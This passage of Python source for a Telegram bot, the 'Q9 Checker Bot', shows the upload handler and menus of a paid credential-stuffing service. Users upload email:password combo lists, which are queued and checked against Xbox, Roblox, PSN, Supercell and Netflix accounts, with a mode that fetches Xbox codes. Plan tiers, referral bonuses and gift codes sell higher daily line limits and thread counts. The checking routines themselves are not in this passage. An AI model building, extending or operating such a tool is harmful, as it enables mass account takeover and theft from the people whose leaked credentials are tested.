        lines=bot.download_file(bot.get_file(m.document.file_id).file_path).decode('utf-8','ignore').splitlines();vc=list(dict.fromkeys([l.strip() for l in lines if ':' in l.strip() and '@' in l.strip().split(':',1)[0] and '.' in l.strip().split(':',1)[0] and len(l.strip().split(':',1))==2]))
        if not vc:bot.reply_to(m,"❌ <b>Error!</b> The file does not contain valid <code>email:pass</code> lines.");return
        fml=get_file_max_lines(user_id)
        if not is_owner and len(vc)>fml:bot.reply_to(m,f"❌ <b>Error!</b> Maximum allowed lines per file for your plan is <code>{fml}</code>. Your file contains <code>{len(vc)}</code> lines.");return
        dl=get_user_daily_limit(user_id)
        if not is_owner and dl!=float('inf'):
            rl=dl-user["today_scans"]
            if rl<=0:bot.reply_to(m,f"🚫 <b>Daily Limit Exceeded!</b>\nYou have reached your max limit of <code>{dl}</code> lines today.\n\n💡 <i>Invite friends to get +500 lines!</i>",reply_markup=get_main_markup(m));return
            if len(vc)>rl:send_with_retry(bot.send_message,m.chat.id,f"⚠️ <b>Notice:</b> Your file contains <code>{len(vc)}</code> lines, but you only have <code>{rl}</code> left.\n✂️ <i>Processing only {rl} lines.</i>");vc=vc[:rl]
        if cm==ScannerMode.ALL_IN_ONE.value and mem!=MembershipStatus.VIP.value and not is_owner:bot.reply_to(m,"👑 <b>VIP Only Feature</b>\n\nThe <b>ALL IN ONE</b> mode is only for VIP. Upgrade to use!");return
        nj=Job(m.chat.id,m.document.file_name,vc,is_mem or is_owner);nj.scanner_mode=cm;msg=send_with_retry(bot.send_message,m.chat.id,"⏳ <i>Adding file to the queue...</i>");nj.msg_id=msg.message_id
        if is_mem or is_owner:
            send_with_retry(bot.edit_message_text,f"✅ <b>File accepted! Starting scan now (Priority Mode) using {cm} Checker...</b>",m.chat.id,msg.message_id)
            with jobs_lock:current_jobs.append(nj)
            threading.Thread(target=run_job,args=(nj,),daemon=True).start()
        else:
            job_queue.put(nj);send_with_retry(bot.edit_message_text,f"✅ <b>File accepted!</b>\nYour position in queue: <code>{job_queue.qsize()}</code>\nMode: {cm}",m.chat.id,msg.message_id)
        if not is_owner:send_with_retry(bot.send_message,"8744777152",f"<b>👤 User Started Scan!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: <code>{user_id}</code>\n👤 Username: @{m.from_user.username or 'No username'}\n📁 File: {m.document.file_name}\n📊 Lines: {len(vc)}\n👑 Membership: {user.get('membership','FREE')}\n🔍 Mode: {cm}\n⏰ Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:bot.reply_to(m,f"❌ <b>An error occurred:</b> <code>{str(e)}</code>")

@bot.callback_query_handler(func=lambda call:True)
@retry_on_error
def handle_query(c):
    global BOT_RUNNING;d,uid=c.data,str(c.message.chat.id)
    if uid in banned_users:bot.answer_callback_query(c.id,"You are banned.");return
    user,_=get_user(uid);update_user_info(uid,c.from_user)
    if d=="check_sub":
        bot.answer_callback_query(c.id,"Checking...",show_alert=False)
        if check_subscription(c.message.chat.id):
            bot.answer_callback_query(c.id,"✅ Verification successful!",show_alert=True)
            dl=get_user_daily_limit(uid);dld=dl if dl!=float('inf') else "∞"
            rem = dl - user.get("today_scans", 0) if dl != float('inf') else "∞"
            mem=user.get("membership",MembershipStatus.FREE.value);exp=user.get("membership_expiry");dlt=" - "
            if exp:
                try:dlt=f"{(datetime.fromisoformat(exp)-datetime.now(timezone.utc)).days} days"
                except Exception:pass
            ut=get_user_thread_count(user);mt=get_max_threads_for_user(user);cm=user.get("scanner_mode",ScannerMode.XBOX.value)
            try:send_with_retry(bot.edit_message_text,f"𖠵 <b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗤𝟵 • 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📤 Send your combo list (.txt file)</b>\n︙ <i>Format: mail:pass (one per line)</i>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>📊 Your Dashboard:</b>\n⌯ 🧵 Threads: <code>{ut} / {mt}</code>\n⌯ 👑 Plan: <code>{mem}</code>\n⌯ 📅 Days Left: <code>{dlt}</code>\n⌯ 📈 Daily Limit: <code>{rem} / {dld} lines</code>\n⌯ 📡 Mode: <code>{cm} Check</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⦿ <b>Select an option from the menu below:</b>",c.message.chat.id,c.message.message_id,reply_markup=get_main_markup(c.message))
            except Exception:pass
        else:
            mk=InlineKeyboardMarkup()
            for sub in force_subs:
                try:
                    cid,clink=sub.split('|')[0],sub.split('|')[1] if '|' in sub else None;ch=bot.get_chat(cid)
                    mk.add(InlineKeyboardButton(f"📢 {ch.title}",url=clink if clink else f"https://t.me/{ch.username}" if ch.username else f"https://t.me/c/{str(cid)[4:]}",style="primary"))
                except Exception:mk.add(InlineKeyboardButton(f"📢 Join Channel",url="https://t.me/",style="primary"))
            mk.add(InlineKeyboardButton("✅ Check Membership",callback_data="check_sub",style="success"))
            try:send_with_retry(bot.edit_message_text,"<b>🔒 CHANNEL MEMBERSHIP REQUIRED</b>\n\nTo use this bot, you must join our channel first!\n\n👇 Click the button below to join, then press ✅ Check Membership.",c.message.chat.id,c.message.message_id,reply_markup=mk)
            except Exception:pass
            bot.answer_callback_query(c.id,"❌ You are not subscribed to all required channels.")
        return
    elif d=="rewards_menu":
        bot.answer_callback_query(c.id)
        now = datetime.now(timezone.utc)
        user_reward_data = rewards_db.get(uid, {"last_daily": None, "claimed_codes": [], "temp_lines": 0, "temp_lines_expiry": None})
        last_daily = user_reward_data.get("last_daily")
        ready = True
        time_str = "🟢 Ready to Claim!"
        if last_daily:
            last_date = datetime.fromisoformat(last_daily)
            diff = (now - last_date).total_seconds()
            if diff < 86400:
                ready = False
                rem = int(86400 - diff)
                h, r = divmod(rem, 3600)
                m, s = divmod(r, 60)
                time_str = f"⏳ {h:02d}:{m:02d}:{s:02d}"
        txt=f"𖠵 <b>🎁 Rewards & Gifts Hub</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nClaim your daily free lines or redeem premium gift codes provided by the admin.\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>📊 Your Daily Statistics:</b>\n⌯ Next Reward In: <code>{time_str}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        mk=InlineKeyboardMarkup(row_width=1)
        if ready: mk.add(InlineKeyboardButton("🎁 Claim Daily Reward",callback_data="claim_daily"))
        else: mk.add(InlineKeyboardButton(f"⏳ Unlocks in: {time_str}",callback_data="none"))
        mk.add(InlineKeyboardButton("🎟 REDEEM GIFT CODE",callback_data="redeem_code_prompt"), InlineKeyboardButton("🔙 Back",callback_data="back_home"))
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="cancel_to_rewards":
        bot.answer_callback_query(c.id)
        try:bot.clear_step_handler_by_chat_id(c.message.chat.id)
        except Exception:pass
        now = datetime.now(timezone.utc)
        user_reward_data = rewards_db.get(uid, {"last_daily": None, "claimed_codes": [], "temp_lines": 0, "temp_lines_expiry": None})
        last_daily = user_reward_data.get("last_daily")
        ready = True
        time_str = "🟢 Ready to Claim!"
        if last_daily:
            last_date = datetime.fromisoformat(last_daily)
            diff = (now - last_date).total_seconds()
            if diff < 86400:
                ready = False
                rem = int(86400 - diff)
                h, r = divmod(rem, 3600)
                m, s = divmod(r, 60)
                time_str = f"⏳ {h:02d}:{m:02d}:{s:02d}"
        txt=f"𖠵 <b>🎁 Rewards & Gifts Hub</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nClaim your daily free lines or redeem premium gift codes provided by the admin.\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>📊 Your Daily Statistics:</b>\n⌯ Next Reward In: <code>{time_str}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        mk=InlineKeyboardMarkup(row_width=1)
        if ready: mk.add(InlineKeyboardButton("🎁 Claim Daily Reward",callback_data="claim_daily"))
        else: mk.add(InlineKeyboardButton(f"⏳ Unlocks in: {time_str}",callback_data="none"))
        mk.add(InlineKeyboardButton("🎟 REDEEM GIFT CODE",callback_data="redeem_code_prompt"), InlineKeyboardButton("🔙 Back",callback_data="back_home"))
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="cancel_to_settings":
        bot.answer_callback_query(c.id)
        try:bot.clear_step_handler_by_chat_id(c.message.chat.id)
        except Exception:pass
        mk=InlineKeyboardMarkup(row_width=2);mk.add(InlineKeyboardButton("🧵 Set Threads",callback_data="set_threads",style="primary"),InlineKeyboardButton("📡 API Mode",callback_data="api_mode_select",style="primary"),InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger"))
        try:send_with_retry(bot.edit_message_text,f"𖠵 <b>⚙️ Settings Menu</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nConfigure your bot preferences below:\n\n➪ <b>🧵 Threads:</b> Control scan speed\n︙ Current: <code>{get_user_thread_count(user)}</code> threads\n\n➪ <b>📡 API Mode:</b> Select scanning method\n︙ Current: <code>{user.get('scanner_mode',ScannerMode.XBOX.value)}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<i>Click a button to configure:</i>",c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="claim_daily":
        now=datetime.now(timezone.utc)
        user_reward_data=rewards_db.get(uid,{"last_daily":None,"claimed_codes":[],"temp_lines":0,"temp_lines_expiry":None})
        last_daily=user_reward_data.get("last_daily")
        if last_daily:
            last_date=datetime.fromisoformat(last_daily)
            if (now-last_date).total_seconds()<86400:
                bot.answer_callback_query(c.id,"⚠️ You have already claimed your daily reward today! Come back tomorrow.",show_alert=True)
                return
        max_reward = CUSTOM_THREADS.get("daily_reward_max", 1000)
        reward_amount = random.randint(100, max_reward)
        current_temp = user_reward_data.get("temp_lines", 0)
        exp = user_reward_data.get("temp_lines_expiry")
        if exp and now > datetime.fromisoformat(exp): current_temp = 0
        user_reward_data["temp_lines"] = current_temp + reward_amount
        user_reward_data["temp_lines_expiry"] = (now + timedelta(days=1)).isoformat()
        user_reward_data["last_daily"] = now.isoformat()
        rewards_db[uid]=user_reward_data
        save_db_rewards()
        bot.answer_callback_query(c.id,f"🎉 Congratulations! You received +{reward_amount} lines (Valid for 24H).",show_alert=True)
        time_str = "⏳ 23:59:59"
        txt=f"𖠵 <b>🎁 Rewards & Gifts Hub</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nClaim your daily free lines or redeem premium gift codes provided by the admin.\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>📊 Your Daily Statistics:</b>\n⌯ Next Reward In: <code>{time_str}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        mk=InlineKeyboardMarkup(row_width=1)
        mk.add(InlineKeyboardButton(f"⏳ Unlocks in: {time_str}",callback_data="none"))
        mk.add(InlineKeyboardButton("🎟 REDEEM GIFT CODE",callback_data="redeem_code_prompt"), InlineKeyboardButton("🔙 Back",callback_data="back_home"))
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        try:send_with_retry(bot.send_message, "8744777152", f"🎁 <b>Daily Reward Claimed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 User ID: <code>{uid}</code>\n🔗 Username: @{user.get('username') or 'None'}\n📈 Reward: <b>+{reward_amount} lines</b>\n⏰ Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception:pass
        return
    elif d=="redeem_code_prompt":
        bot.answer_callback_query(c.id)
        txt="🎟 <b>𝗚𝗜𝗙𝗧 𝗖𝗢𝗗𝗘 𝗥𝗘𝗗𝗘𝗠𝗣𝗧𝗜𝗢𝗡</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nPlease enter the gift code you received to claim your reward.\n\n📌 <b>Format:</b> GIF-XXXXXXXX\n\n💬 Send the code now.\n• or send /cancel to abort."
        mk=InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("🔙 Back",callback_data="cancel_to_rewards"))
        msg=send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=mk)
        if msg:
            try:bot.clear_step_handler_by_chat_id(c.message.chat.id)
            except Exception:pass
            bot.register_next_step_handler(msg,process_redeem_code)
        return
    elif d=="manage_gifts":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        txt="<b>🎁 Generate Gift Code</b>\n\nSelect what type of gift you want to create:"
        mk=InlineKeyboardMarkup(row_width=2)
        mk.add(InlineKeyboardButton("⭐ BASIC Sub",callback_data="gen_code_basic"), InlineKeyboardButton("👑 VIP Sub",callback_data="gen_code_vip"), InlineKeyboardButton("📈 Extra Lines",callback_data="gen_code_lines"), InlineKeyboardButton("🛑 Revoke All Codes",callback_data="revoke_all_codes"), InlineKeyboardButton("🔙 Back",callback_data="owner_panel"))
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d.startswith("gen_code_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        rtype=d.split("_")[-1]
        txt="<b>⚙️ 𝗖𝗢𝗗𝗘 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 (𝗦𝘁𝗲𝗽 𝟭/𝟮)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👥 <b>Usage Limit Setup</b>\n\n<i>How many users should be able to redeem this specific code?</i>\n\n💬 <b>Action:</b> Send a number (e.g., <code>1</code>, <code>5</code>, <code>100</code>) or /cancel"
        msg=send_with_retry(bot.send_message,c.message.chat.id,txt)
        bot.register_next_step_handler(msg,process_gen_code_step1,rtype)
        return
    elif d=="revoke_all_codes":
        if uid!="8744777152":return
        gift_codes_db.clear();save_db_gift_codes()
        bot.answer_callback_query(c.id,"🛑 All gift codes deactivated!",show_alert=True)
        return
    elif d=="membership_plans":
        bot.answer_callback_query(c.id)
        txt=f"𖠵 <b>👑 MEMBERSHIP PLANS</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>🆓 FREE PLAN</b>\n︙ Daily Limit: 5,000 lines\n︙ Max Threads: 1-{CUSTOM_THREADS.get('free',50)}\n︙ Single scan at a time \n︙ Queue Waiting System\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>⭐ BASIC PLAN (WEEKLY)</b>\n︙ Duration: 7 Days\n︙ Daily Limit: 25,000 lines\n︙ Max Threads: 1-{CUSTOM_THREADS.get('basic',75)}\n︙ Multi-Scan: Up to 3 files\n︙ No Queue Waiting\n︙ Priority Support\n<b>— Price: Telegram Stars: 200 Stars</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>👑 VIP PLAN (MONTHLY)</b>\n︙ Duration: 30 Days\n︙ Daily Limit: Unlimited lines\n︙ Max Threads: 1-{CUSTOM_THREADS.get('vip',125)}\n︙ Multi-Scan: Up to 5 files\n︙ No Queue Waiting\n︙ ALL IN ONE Scanner Mode\n<b>— Price: Telegram Stars: 600 Stars</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⦿ <b>Your Current Plan:</b> <code>{user.get('membership',MembershipStatus.FREE.value)}</code>\n\n⚠️ <b>Payment Method</b>\nTelegram Stars only (currently accepted)\n\n💳 <b>To Purchase A Membership</b>\n<b>Contact: @C_V_R7</b>"
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger")))
        except Exception:pass
        return
    elif d=="support_contact":
        bot.answer_callback_query(c.id)
        try:send_with_retry(bot.edit_message_text,"𖠵 <b>📞 Support & Contact</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n<i>Need help or want to upgrade?</i>\n\n➪ Contact: <a href=\"https://t.me/C_V_R7\">@C_V_R7</a>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n",c.message.chat.id,c.message.message_id,reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger")))
        except Exception:pass
        return
    elif d=="my_stats":
        bot.answer_callback_query(c.id)
        dl=get_user_daily_limit(uid);dld=dl if dl!=float('inf') else "∞ (Owner/VIP)";rem=dl-user["today_scans"] if dl!=float('inf') else "∞";sr=f"{(user['total_hits']/user['total_scans']*100):.2f}" if user['total_scans']>0 else "0.00";mem=user.get("membership",MembershipStatus.FREE.value);exp=user.get("membership_expiry",None);expt="N/A"
        if exp:
            try:expt=datetime.fromisoformat(exp).strftime("%Y-%m-%d")
            except Exception:expt="Invalid"
        rd=rewards_db.get(uid,{})
        claimed_codes_count=len(rd.get("claimed_codes",[]))
        now=datetime.now(timezone.utc)
        used_today="No"
        last_d=rd.get("last_daily")
        if last_d and (now-datetime.fromisoformat(last_d)).total_seconds()<86400:used_today="Yes"
        valid_temp_lines=0
        if rd.get("temp_lines",0)>0 and rd.get("temp_lines_expiry"):
            if now<datetime.fromisoformat(rd["temp_lines_expiry"]):valid_temp_lines=rd["temp_lines"]
        base_plan_limit=25000 if user.get("membership")==MembershipStatus.BASIC.value else (float('inf') if user.get("membership")==MembershipStatus.VIP.value else 5000)
        ref_lines=user.get('referrals',0)*500
        txt=f"""𖠵 <b>📊 Your Statistics</b> 𖥻
━━━━━━━━━━━━━━━━━━━━━━━━━━━
➪ <b>👤 User ID:</b> <code>{uid}</code>
➪ <b>📅 Registered:</b> <code>{user['registered_date']}</code>
➪ <b>👑 Plan:</b> {mem}
➪ <b>📅 Expires:</b> {expt}
➪ <b>📡 Mode:</b> {user.get('scanner_mode', ScannerMode.XBOX.value)}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
➪ <b>🧵 Threads:</b> <code>{get_user_thread_count(user)} / {get_max_threads_for_user(user)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ <b>📈 General Statistics:</b>
⌯ ✅ Total Scans: <code>{user['total_scans']}</code>
⌯ 💎 Total Hits: <code>{user['total_hits']}</code>
⌯ 🆓 Total FREE: <code>{user.get('total_free_hits', 0)}</code>
⌯ 🎯 Success Rate: <code>{sr}%</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ <b>📊 Today's Statistics:</b>
⌯ 📊 Scans Used: <code>{user['today_scans']}</code>
⌯ ⏳ Remaining: <code>{rem} / {dld}</code>
⌯ 👥 Referrals: <code>{user.get('referrals', 0)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ <b>🎁 Rewards & Limits Details:</b>
⌯ 🎟 Claimed Codes: <code>{claimed_codes_count}</code>
⌯ 🎁 Daily Reward Claimed Today: <code>{used_today}</code>
⌯ ✨ Daily Reward Lines (Active): <code>{valid_temp_lines}</code>
⌯ 👥 Referral Bonus Lines: <code>+{ref_lines}</code>
⌯ 📦 Base Plan Limit: <code>{base_plan_limit if base_plan_limit!=float('inf') else 'Unlimited'}</code>"""
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger")))
        except Exception:pass
        return
    elif d=="referral_sys":
        bot.answer_callback_query(c.id)
        dl=get_user_daily_limit(uid);bl=25000 if user.get("membership")==MembershipStatus.BASIC.value else (100000 if user.get("membership")==MembershipStatus.VIP.value else 5000);bn=user["referrals"]*500;ml=bl+bn if dl!=float('inf') else "∞";rlink=f"https://t.me/{BOT_USERNAME}?start={uid}"
        txt=f"𖠵 <b>🔗 My Referrals</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>📊 Your Statistics:</b>\n⌯ <b>✅ Referral Count:</b> <code>{user['referrals']}</code>\n⌯ <b>📈 Your Daily Limit:</b> <code>{ml} lines</code>\n⌯ <b>💰 Bonus:</b> <code>+{bn} lines</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎁 <b>Earn +500 lines for each referral!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>🔗 Your Referral Link:</b>\n{rlink}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📤 <i>Share this link with your friends!</i>\nYour daily limit increases by 500 lines for each person who registers using your link.\n\n<b>💡 Example:</b>\n︙ 0 referrals = {bl} lines/day\n︙ 1 referral = {bl+500} lines/day\n︙ 5 referrals = {bl+2500} lines/day\n︙ 10 referrals = {bl+5000} lines/day"
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger")))
        except Exception:pass
        return
    elif d=="back_home":
        bot.answer_callback_query(c.id)
        dl=get_user_daily_limit(uid)
        rem = dl - user.get("today_scans", 0) if dl != float('inf') else "∞"
        dld = dl if dl != float('inf') else "∞"
        mem=user.get("membership",MembershipStatus.FREE.value);exp=user.get("membership_expiry");dl_left=" - "
        if exp:
            try:dl_left=f"{(datetime.fromisoformat(exp)-datetime.now(timezone.utc)).days} days"
            except Exception:pass
        ut=get_user_thread_count(user);mt=get_max_threads_for_user(user);cm=user.get("scanner_mode",ScannerMode.XBOX.value)
        try:send_with_retry(bot.edit_message_text,f"𖠵 <b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗤𝟵 • 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📤 Send your combo list (.txt file)</b>\n︙ <i>Format: mail:pass (one per line)</i>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>📊 Your Dashboard:</b>\n⌯ 🧵 Threads: <code>{ut} / {mt}</code>\n⌯ 👑 Plan: <code>{mem}</code>\n⌯ 📅 Days Left: <code>{dl_left}</code>\n⌯ 📈 Daily Limit: <code>{rem} / {dld} lines</code>\n⌯ 📡 Mode: <code>{cm} Check</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⦿ <b>Select an option from the menu below:</b>",c.message.chat.id,c.message.message_id,reply_markup=get_main_markup(c.message))
        except Exception:pass
        return
    elif d=="user_settings":
        bot.answer_callback_query(c.id)
        mk=InlineKeyboardMarkup(row_width=2);mk.add(InlineKeyboardButton("🧵 Set Threads",callback_data="set_threads",style="primary"),InlineKeyboardButton("📡 API Mode",callback_data="api_mode_select",style="primary"),InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger"))
        try:send_with_retry(bot.edit_message_text,f"𖠵 <b>⚙️ Settings Menu</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nConfigure your bot preferences below:\n\n➪ <b>🧵 Threads:</b> Control scan speed\n︙ Current: <code>{get_user_thread_count(user)}</code> threads\n\n➪ <b>📡 API Mode:</b> Select scanning method\n︙ Current: <code>{user.get('scanner_mode',ScannerMode.XBOX.value)}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<i>Click a button to configure:</i>",c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="set_threads":
        bot.answer_callback_query(c.id)
        mem=user.get("membership",MembershipStatus.FREE.value);lh=CUSTOM_THREADS.get("basic",75) if mem==MembershipStatus.BASIC.value else CUSTOM_THREADS.get("vip",125) if mem==MembershipStatus.VIP.value else CUSTOM_THREADS.get("free",50)
        txt=f"𖠵 <b>🧵 Set Thread Count</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nLimits by plan:\n🆓 FREE: 1-{CUSTOM_THREADS.get('free',50)}\n⭐ BASIC: 1-{CUSTOM_THREADS.get('basic',75)}\n👑 VIP: 1-{CUSTOM_THREADS.get('vip',125)}\n\nYour plan ({mem}) allows 1-{lh} threads.\n\nCurrent threads: {get_user_thread_count(user)}\n\nSend a number between 1 and {lh} to set your thread count."
        mk=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back",callback_data="cancel_to_settings"))
        msg=send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=mk)
        if msg:
            try:bot.clear_step_handler_by_chat_id(c.message.chat.id)
            except Exception:pass
            bot.register_next_step_handler(msg,process_set_user_threads,c.message.message_id)
        return
    elif d=="api_mode_select":
        bot.answer_callback_query(c.id)
        cm=user.get("scanner_mode",ScannerMode.XBOX.value)
        ft=f"𖠵 <b>📡 API Mode Selection</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{get_mode_description(cm)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<b>Current Mode:</b> <code>{cm}</code>\n\nClick on a mode below to switch:"
        mk=InlineKeyboardMarkup(row_width=2)
        mk.add(InlineKeyboardButton("🎮 Xbox Mode",callback_data="set_mode_xbox"), InlineKeyboardButton("🎮 Roblox Mode",callback_data="set_mode_roblox"))
        mk.add(InlineKeyboardButton("🎮 PSN Mode V2",callback_data="set_mode_psnv2"), InlineKeyboardButton("🎮 Supercell Mode",callback_data="set_mode_supercell"))
        mk.add(InlineKeyboardButton("🟥 Netflix Mode",callback_data="set_mode_netflix"), InlineKeyboardButton("⚡ Speed Mode",callback_data="set_mode_speed"))
        mk.add(InlineKeyboardButton("💎 Xbox code Fetcher", callback_data="set_mode_xbox_fetcher"))
        mk.add(InlineKeyboardButton("👑 ALL IN ONE",callback_data="set_mode_allinone",style="success"))
        mk.add(InlineKeyboardButton("🔙 Back to Settings",callback_data="user_settings",style="danger"))
        try:send_with_retry(bot.edit_message_text,ft,c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d in ["set_mode_xbox","set_mode_roblox","set_mode_psnv2","set_mode_supercell","set_mode_netflix","set_mode_speed","set_mode_xbox_fetcher"]:
        mode_val = ScannerMode.XBOX.value if d=="set_mode_xbox" else ScannerMode.ROBLOX.value if d=="set_mode_roblox" else ScannerMode.PSN_V2.value if d=="set_mode_psnv2" else ScannerMode.NETFLIX.value if d=="set_mode_netflix" else ScannerMode.SPEED.value if d=="set_mode_speed" else ScannerMode.XBOX_CODE_FETCHER.value if d=="set_mode_xbox_fetcher" else ScannerMode.SUPERCELL.value
        if mode_val in disabled_modes and uid!="8744777152":
            bot.answer_callback_query(c.id,"⚠️ This mode is currently disabled by the admin for maintenance.",show_alert=True)
            return
        if user["scanner_mode"]!=mode_val:
            user["scanner_mode"]=mode_val;save_db(db,DB_FILE)
            bot.answer_callback_query(c.id,f"✅ Updated API Mode")
        else:bot.answer_callback_query(c.id,f"ℹ️ Already in this mode")
        cm=user.get("scanner_mode",ScannerMode.XBOX.value)
        ft=f"𖠵 <b>📡 API Mode Selection</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{get_mode_description(cm)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<b>Current Mode:</b> <code>{cm}</code>\n\nClick on a mode below to switch:"
        mk=InlineKeyboardMarkup(row_width=2)
        mk.add(InlineKeyboardButton("🎮 Xbox Mode",callback_data="set_mode_xbox"), InlineKeyboardButton("🎮 Roblox Mode",callback_data="set_mode_roblox"))
        mk.add(InlineKeyboardButton("🎮 PSN Mode V2",callback_data="set_mode_psnv2"), InlineKeyboardButton("🎮 Supercell Mode",callback_data="set_mode_supercell"))
        mk.add(InlineKeyboardButton("🟥 Netflix Mode",callback_data="set_mode_netflix"), InlineKeyboardButton("⚡ Speed Mode",callback_data="set_mode_speed"))
        mk.add(InlineKeyboardButton("💎 Xbox code Fetcher", callback_data="set_mode_xbox_fetcher"))
        mk.add(InlineKeyboardButton("👑 ALL IN ONE",callback_data="set_mode_allinone",style="success"))
        mk.add(InlineKeyboardButton("🔙 Back to Settings",callback_data="user_settings",style="danger"))
        try:send_with_retry(bot.edit_message_text,ft,c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="set_mode_allinone":
        if ScannerMode.ALL_IN_ONE.value in disabled_modes and uid!="8744777152":
            bot.answer_callback_query(c.id,"⚠️ This mode is currently disabled by the admin for maintenance.",show_alert=True)
            return
        if user.get("membership",MembershipStatus.FREE.value)!=MembershipStatus.VIP.value and uid!="8744777152":bot.answer_callback_query(c.id,"👑 This mode is only available for VIP members! Upgrade to VIP to use ALL IN ONE scanner.",show_alert=True);return
        if user["scanner_mode"]!=ScannerMode.ALL_IN_ONE.value:
            user["scanner_mode"]=ScannerMode.ALL_IN_ONE.value;save_db(db,DB_FILE)
            bot.answer_callback_query(c.id,"✅ Switched to ALL IN ONE Mode (VIP)")
        else:bot.answer_callback_query(c.id,"ℹ️ Already in ALL IN ONE Mode")
        cm=user.get("scanner_mode",ScannerMode.XBOX.value)
        ft=f"𖠵 <b>📡 API Mode Selection</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{get_mode_description(cm)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<b>Current Mode:</b> <code>{cm}</code>\n\nClick on a mode below to switch:"
        mk=InlineKeyboardMarkup(row_width=2)
        mk.add(InlineKeyboardButton("🎮 Xbox Mode",callback_data="set_mode_xbox"), InlineKeyboardButton("🎮 Roblox Mode",callback_data="set_mode_roblox"))
